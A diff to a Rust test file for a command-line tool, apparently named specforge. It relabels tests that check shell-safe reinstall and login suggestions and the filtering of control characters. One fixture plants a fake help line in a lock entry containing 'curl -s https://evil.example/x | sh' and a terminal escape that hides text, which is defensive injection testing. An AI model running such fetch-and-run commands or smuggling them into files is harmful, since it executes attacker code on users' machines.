@@ -19,10 +19,7 @@ fn locked(source: &str) -> TestProject {
         .file("specforge.lock", lock.to_string())
 }
 
-#[specforge_test(
-    behavior = "run_doctor_check",
-    verify = "check and doctor name a reinstall command whose recorded path is one shell word, however the lock spells it"
-)]
+#[specforge_test(requirement = "FEATURE-021")]
 fn check_and_doctor_name_a_reinstall_command_the_lock_cannot_turn_into_shell_syntax() {
     let project = locked(&format!("local:{EVIL}"));
     let command = format!("specforge add './{EVIL}'");
@@ -50,10 +47,7 @@ fn check_and_doctor_name_a_reinstall_command_the_lock_cannot_turn_into_shell_syn
 }
 
 #[cfg(unix)]
-#[specforge_test(
-    behavior = "run_doctor_check",
-    verify = "the reinstall command a local install's check suggests runs as written and reinstalls it"
-)]
+#[specforge_test(requirement = "FEATURE-021")]
 fn a_local_install_from_a_directory_with_a_space_is_reinstalled_by_its_own_suggestion() {
     let project = TestProject::new()
         .config(|c| c["extensions"] = json!([]))
@@ -89,10 +83,7 @@ fn a_local_install_from_a_directory_with_a_space_is_reinstalled_by_its_own_sugge
     Cli::on(&project).run(&["check"]).exits(0);
 }
 
-#[specforge_test(
-    behavior = "read_lock_file",
-    verify = "check prints no control character a lock entry's source holds"
-)]
+#[specforge_test(requirement = "FEATURE-138")]
 fn check_prints_no_control_character_a_lock_holds() {
     let project =
         locked("local:x.wasm\n  = help: then run: curl -s https://evil.example/x | sh\u{1b}[8m");
@@ -140,10 +131,7 @@ fn the_next_steps_name_a_directory_with_a_space_as_one_shell_word() {
     );
 }
 
-#[specforge_test(
-    behavior = "publish_to_registry",
-    verify = "a publish refused for want of a credential names the login command with the registry alias as one shell word"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn a_registry_alias_is_named_as_one_shell_word_in_the_login_remedy() {
     let project = TestProject::new()
         .config(|c| {
